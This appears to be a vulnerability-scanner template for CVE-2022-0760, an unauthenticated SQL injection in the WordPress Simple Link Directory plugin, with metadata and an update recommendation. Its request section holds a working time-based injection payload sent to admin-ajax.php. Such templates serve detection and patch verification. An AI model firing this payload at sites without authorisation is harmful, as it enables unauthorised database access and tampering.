id: CVE-2022-0760
info:
  name: WordPress Simple Link Directory <7.7.2 - SQL injection
  author: theamanrawat
  severity: critical
  description: The WordPress Simple Link Directory plugin before version 7.7.2 is
    vulnerable to SQL injection, allowing attackers to obtain sensitive information,
    modify data, and execute unauthorized administrative operations.
  reference:
  - https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210
  - https://wordpress.org/plugins/simple-link-directory/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0760
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0760
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The SQL injection vulnerability in WordPress Simple Link Directory plugin
      before 7.7.2 can lead to unauthorized access, data modification, and administrative
      operations in the affected site.
    recommendation: It is recommended to update WordPress Simple Link Directory plugin
      to version 7.7.2 or later to mitigate the SQL injection vulnerability.
  tags: cve,cve2022,sqli,wordpress,wp-plugin,wp,simple-link-directory,unauth,wpscan
requests:
- raw:
  - '@timeout 20s

    POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=qcopd_upvote_action&post_id=(SELECT 3 FROM (SELECT SLEEP(7))enz)

    '
  matchers:
  - type: dsl
    dsl:
    - duration>=7
    - status_code == 200 || status_code == 500
    - contains(content_type, "text/html")
    - contains(body, "vote_status") || contains(body, "critical error")
    condition: and
